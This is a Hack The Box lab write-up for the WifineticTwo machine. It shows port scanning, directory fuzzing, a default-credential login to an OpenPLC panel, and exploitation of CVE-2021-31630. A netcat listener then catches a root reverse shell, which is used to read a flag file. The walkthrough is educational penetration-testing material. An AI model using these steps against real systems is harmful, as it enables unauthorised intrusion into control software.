![WifineticTwo](https://github.com/amalcew/htb-writeups/assets/73908014/c22abb67-1d9f-4664-8382-db4c2918cd99)

## Reconnaissance & port scanning

Starting with the enumeration:

```bash
> nmap 10.10.11.7 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-24 15:13 CEST
Nmap scan report for 10.10.11.7 (10.10.11.7)
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
```

The target is hosting a website on port 8080, so let's fuzz the directories:

```bash
> ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.11.7:8080/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.7:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 200, Size: 4550, Words: 1574, Lines: 138, Duration: 143ms]
users                   [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 115ms]
hardware                [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 120ms]
programs                [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 123ms]
logout                  [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 134ms]
settings                [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 143ms]
dashboard               [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 104ms]
monitoring              [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 74ms]
                        [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 227ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

The host contain some valuable endpoints, which will prove useful.

The webpage greets us with login prompt:

![01-initial_page](https://github.com/amalcew/htb-writeups/assets/73908014/53fd1654-21c5-431d-ba3c-62f62c273558)

## Initial foothold

### Default credentials

Inspection of the page did not returned any clues, so before starting bruteforcing the credentials it is always important to check the documentation for any default credentials.

![Untitled](https://github.com/amalcew/htb-writeups/assets/73908014/d6db6aec-59a5-4824-9c6e-0d06e5ea21e8)

Apparently, this was sufficient to gain access to the panel:

![image](https://github.com/amalcew/htb-writeups/assets/73908014/e7f2c6b9-77c2-403b-8cd8-54a35f769633)

### Command injection

As box exploration followed, I've discovered that the target might be vulnerable to [CVE-2021-31630](https://nvd.nist.gov/vuln/detail/CVE-2021-31630), which means that it should be possible to gain reverse shell to the target.

There are many POCs and exploits on the internet, but attempts to execute them were unsuccessful. To leverage this vulnerability, the manual exploitation is required:

After logging to the panel, paste the payload inside hardware tab:

![02-hardware](https://github.com/amalcew/htb-writeups/assets/73908014/071d38bf-6fdf-40cf-b040-7b15cf826e3a)

Now the code need to be compiled:

![03-compilation](https://github.com/amalcew/htb-writeups/assets/73908014/797930c8-46b8-4dbb-889d-69a5a35446a4)

To execute the  reverse shell, we need to start the PLC:

![04-start_plc](https://github.com/amalcew/htb-writeups/assets/73908014/4a4d58ff-0245-427f-a6a1-f187cbf75a54)

The remote code execution is achieved:

```bash
> nc -lnvp 1234  
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.7] 38300
bash: cannot set terminal process group (171): Inappropriate ioctl for device
bash: no job control in this shell
root@attica02:/opt/PLC/OpenPLC_v3/webserver# whoami
whoami
root
root@attica02:/opt/PLC/OpenPLC_v3/webserver# cat /root/user.txt
cat /root/user.txt
c9ae************************b381
```
